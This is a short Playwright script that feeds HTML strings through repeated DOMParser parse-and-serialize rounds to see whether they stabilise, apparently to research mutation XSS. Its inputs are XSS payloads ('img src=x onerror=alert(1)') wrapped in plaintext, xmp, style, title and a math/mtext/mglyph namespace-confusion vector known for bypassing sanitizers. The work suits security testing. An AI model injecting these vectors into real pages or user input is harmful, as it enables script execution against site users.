import {chromium} from 'playwright';
const browser=await chromium.launch({executablePath:'/opt/pw-browsers/chromium-1194/chrome-linux/chrome',args:['--no-sandbox']});
const page=await browser.newPage();
await page.setContent('<body></body>');
const res=await page.evaluate(()=>{
  function f(html){html='<body><remove></remove>'+html;const b=new DOMParser().parseFromString(html,'text/html').body;b.firstChild&&b.firstChild.remove();return b.innerHTML;}
  function chain(H0,n){let cur=H0;const out=[cur];for(let i=0;i<n;i++){const nx=f(cur);out.push(nx);if(nx===cur)break;cur=nx;}return out;}
  return {
    plaintext: chain('<plaintext><img src=x onerror=alert(1)>',6),
    xmp: chain('<xmp><img src=x onerror=alert(1)>',6),
    style: chain('<style><img src=x onerror=alert(1)>',6),
    title: chain('<title><img src=x onerror=alert(1)>',6),
    mtext: chain('<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',6),
  };
});
for(const [k,v] of Object.entries(res)){
  console.log('\n=== '+k+' ('+v.length+' entries, '+(v[v.length-1]===v[v.length-2]?'STABILIZED':'STILL CHANGING')+') ===');
  v.forEach((s,i)=>console.log('H'+i+': '+JSON.stringify(s)));
}
await browser.close();
